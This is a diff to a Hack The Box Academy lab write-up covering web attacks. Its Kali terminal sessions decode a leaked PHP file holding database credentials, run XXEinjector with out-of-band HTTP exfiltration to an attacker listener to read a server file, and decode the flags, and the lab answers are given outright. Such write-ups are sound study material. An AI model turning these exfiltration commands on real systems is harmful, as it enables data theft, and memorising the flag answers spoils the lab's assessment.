@@ -103,7 +103,7 @@ Generate a put request and insert the damin values with the new email.
 
 ![](./attachments/Pasted%20image%2020220804133758.png)
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ echo "PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K" | base64 -d
 <?php
@@ -139,7 +139,7 @@ catch ( exception $e ) {
 ### Question:
 ![](./attachments/Pasted%20image%2020220802102511.png)
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Downloads/XXEinjector]
 └─$ ruby XXEinjector.rb --host=10.10.15.75 --httpport=8089 --file=xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter 
 XXEinjector by Jakub Pałaczyński
@@ -158,7 +158,7 @@ Enumeration options:
 [+] Nothing else to do. Exiting.
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Downloads/XXEinjector]
 └─$ cat Logs/10.129.3.201/327a6c4304ad5938eaf0efb6cc3e53dc.php.log
 <?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
@@ -171,7 +171,9 @@ Enumeration options:
 ### Question:
 ![](./attachments/Pasted%20image%2020220802102527.png)
 
-```
+API URL with user info: `IP:PORT/api.php/user/72`
+
+```bash
 ┌──(kali㉿kali)-[~/Downloads/XXEinjector]
 └─$ python3                                                                                                                                
 Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
@@ -195,9 +197,25 @@ Admin token:
 
 ![](./attachments/Pasted%20image%2020220805110502.png)
 
-![](./attachments/Pasted%20image%2020220805110700.png)
+![](./attachments/Pasted%20image%2020220805155026.png)
 
-**Answer:** ``
+Login as admin:
+
+![](./attachments/Pasted%20image%2020220805155425.png)
+
+Create event
+
+![](./attachments/Pasted%20image%2020220805164648.png)
+
+![](./attachments/Pasted%20image%2020220805164825.png)
+
+```bash
+┌──(kali㉿kali)-[~/Downloads]
+└─$ echo "PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K" | base64 -d
+<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
+```
+
+**Answer:** `HTB{m4573r_w3b_4774ck3r}`
 
 ---
 **Tags:** [[Hack The Box Academy]]
